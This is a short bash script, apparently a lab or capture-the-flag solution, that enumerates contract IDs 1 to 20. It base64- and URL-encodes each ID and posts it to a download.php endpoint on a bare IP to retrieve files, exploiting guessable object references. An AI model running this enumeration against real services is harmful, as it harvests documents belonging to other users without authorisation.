#!/bin/bash

for i in {1..20}; do
    hash=$(echo -n "$i" | base64 -w 0)
    urlencoded=$(echo -n "$hash" | jq -sRr @uri)
    curl -sOJ -X POST "http://94.237.61.99:37027/download.php?contract=$urlencoded"
done
